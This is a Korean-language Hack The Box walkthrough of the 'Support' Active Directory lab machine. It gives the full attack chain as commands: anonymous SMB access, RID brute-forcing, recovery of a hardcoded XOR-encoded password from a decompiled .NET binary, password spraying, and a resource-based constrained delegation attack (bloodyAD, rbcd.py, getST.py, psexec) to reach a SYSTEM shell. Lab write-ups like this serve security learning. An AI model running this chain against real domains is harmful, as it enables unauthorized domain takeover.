# HTB-SUPPORT
```bash
OS: Windows(AD)
DATE: 26.09.10
DIFFICULTY: Easy
```

## RECON
**nmap**: 초기 포트 검사를 위해 nmap을 사용하여 전체 포트 검사 이후 상세 포트를 검사했다.
```bash
nmap -p- -T4 IP
nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389 IP | tee nmap
```
검사 결과 88, 135 포트가 있는 것으로 보아 DC IP라는 것을 알 수 있었다.
이후 초기 접근을 위해 익명으로 SMB 서비스에 접근을 시도했고, `support-tools`라는 디렉토리에 접근이 가능했다.
```bash
smbclient //IP/support-tools -N
```
폴더 안에는 여러 zip 파일들과 윈도우 전용 툴들이 있었다. 일단 모두 다운로드한 후 `nxc`를 사용하여 rid-brute를 시도한 결과 유저 리스트도 얻을 수 있었다.
```bash
nxc smb IP -u jdskl -p '' --rid-brute | tee user
```
```bash
cat user | grep SidTypeUser | grep -oP 'SUPPORT\\\K[^ ]+(?= \(SidTypeUser\))' > users.txt
```

## Initial Access
아까 SMB 폴더에서 다운로드받았던 파일 중 `UserInfo.exe.zip`이라는 zip 파일이 있어 unzip해주었다.
```bash
unzip UserInfo.exe.zip
```
하지만 UserInfo.exe 파일은 Windows에서만 작동하기에 Linux에서는 동작하지 못했다. 따라서 `mono`를 이용하여 파일을 실행해보았지만 아무런 단서를 얻지 못했다.
```bash
mono UserInfo.exe 
```
따라서 이번엔 `ilspycmd`라는 프로그램을 이용하여 .exe 파일을 C# 소스코드로 디컴파일했다.
```bash
ilspycmd UserInfo.exe > Userinfo.cs
```
이후 Userinfo.cs 코드를 확인해보니 인코딩된 password와, armando라는 문자열을 ASCII 바이트로 인코딩한 key라는 변수가 있었다. 소스 코드에서는 해당 password를 바이트 형식으로 base64 인코딩한 뒤, 그 인코딩된 값에 `^` 연산자를 사용하여 XOR 연산을 수행했다. 그리고 `0xDF`라는 HEX 값도 함께 XOR 연산을 적용했다.
```cs
internal class Protected
	{
		private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

		private static byte[] key = Encoding.ASCII.GetBytes("armando");

		public static string getPassword()
		{
			byte[] array = Convert.FromBase64String(enc_password);
			byte[] array2 = array;
			for (int i = 0; i < array.Length; i++)
			{
				array2[i] = (byte)((uint)(array[i] ^ key[i % key.Length]) ^ 0xDFu);
			}
			return Encoding.Default.GetString(array2);
		}
	}
```
따라서 `CyberChef`를 사용하여 디코딩을 시도했다. 먼저 `From Base64` op를 가져오고, `XOR`을 두 개 가져와서 하나는 UTF-8 key로 세팅한 후 `armando`를 입력하고, 하나는 hex로 세팅하여 `df`를 추가해주었다. 디코딩 결과 강력한 password가 나왔고 디코딩에 성공했다.
![cyberchef](attach_real/Pasted%20image%2020260911154420.png)
이후 아까 얻었던 users.txt와 얻은 password로 무작위 대입을 하니 `ldap`이라는 계정을 얻을 수 있었다. 바로 WinRM, RDP 등을 시도해본 결과 실패했다. 따라서 LDAP을 이용하기로 했다. 먼저 `ldapdomaindump`를 사용하여 LDAP 정보를 확인해보았지만 너무나도 많은 정보가 있어 확인하기 어려웠다. 따라서 이번에 새로 알게 된 `Apache Directory Studio`를 사용하여 LDAP을 더 편하고 자세히 확인할 수 있었다. 이 프로그램은 LDAP 서버를 GUI로 탐색하는 프로그램이다.
```bash
./ApacheDirectoryStudio
```
![ads](attach_real/Pasted%20image%2020260911151814.png)
확인해보니 CN=Users에 support라는 유저 info에 password와 비슷한 것이 있어, support 유저로 접속을 시도해본 결과 성공하여 WinRM을 이용해 쉘도 얻을 수 있었다.
![user](attach_real/Pasted%20image%2020260911132005.png)

## Privilege Escalation
처음 쉘에 접근하고 BloodHound를 사용하여 support 유저부터 domain까지 취약점이 있는지 찾아보았다.
```bash
bloodhound-python -u support -p PASS -d support.htb -ns IP -c all
```
```bash
bloodhound-start
```
BloodHound를 확인해보니 DC_PC 사이에 GenericAll 취약점이 있었다. 따라서 bloodyAD를 사용하여 취약점을 exploit해보았다. 컴퓨터 객체이기 때문에 그 컴퓨터에 대해 `RBCD(Resource-Based Constrained Delegation)`, 즉 위임을 설정하는 공격을 시도했다.
```bash
bloodyAD --host IP -d DOMAIN -u USER -p PASS add computer 'ATTACKERSYSTEM' 'Summer2018!'
```
이로써 가짜 컴퓨터를 생성하고 위임 설정을 걸어주었다.
```bash
rbcd.py -delegate-from 'ATTACKERSYSTEM$' -delegate-to 'DC$' -action 'write' 'DOMAIN/USER:PASS' -dc-ip IP
```
- **-delegate-from**: 위임받는 쪽
- **-delegate-to**: 위임 대상
- **-action**: 위임 관계

위임도 설정해주었고, 이후 Administrator 사칭 티켓을 발급했다.
```bash
getST.py -spn 'cifs/dc.support.htb' -impersonate 'administrator' 'DOMAIN/COMP_NAME:COMP_PASS' -dc-ip IP
```
- **-spn**: 어떤 서비스 티켓을 받을지 설정. cifs = 파일 공유 서비스(SMB). 이걸로 psexec를 사용하여 접속 가능.

이렇게 하여 **administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache**라는 티켓이 들어있는 cache 파일을 받았다. 이제 쉘을 얻기 위해 티켓 파일을 KRB5CCNAME으로 export해주고 psexec.py로 쉘 접속을 시도했다.
```bash
export KRB5CCNAME=administrator@cifs_dc.support.htb@SUPPORT.HTB.ccache
```
```bash
psexec.py -k -no-pass DOMAIN/USER@DC_IP
```
- -k: Kerberos 티켓 사용 (방금 export로 지정한 티켓)
- -no-pass: 패스워드 없이 티켓으로 인증

이로써 SYSTEM 쉘로 접속할 수 있었다.
![system](attach_real/Pasted%20image%2020260911132005.png)

## New Inform
- mono: 리눅스/맥에서 .NET 프로그램을 실행하게 해주는 프로그램
- ilspycmd: .NET 디컴파일러
- AES나 옛날 이름인 RijndaelManaged가 보이면 AES 암호화. 이 암호화는 키가 필요.
- FromBase64String 디코딩, ToBase64String 인코딩
- `ldapdomaindump`와 `ldapsearch` 툴은 둘 다 LDAP 결과를 모아주는 비슷한 도구이다.
- AD에서 유저명을 입력할 때는 user@domain 또는 domain\user 방식으로 접속해야 한다.
- GenericAll: AD 객체에 대한 완전 제어 권한. 어떤 계정이 다른 객체에 GenericAll을 가지면 그 객체에 대해 뭐든 할 수 있다.
- impacket 도구들은 KRB5CCNAME이라는 환경변수를 보고 티켓 파일 위치를 찾도록 만들어져 있어, 파일을 설정해주어야 한다.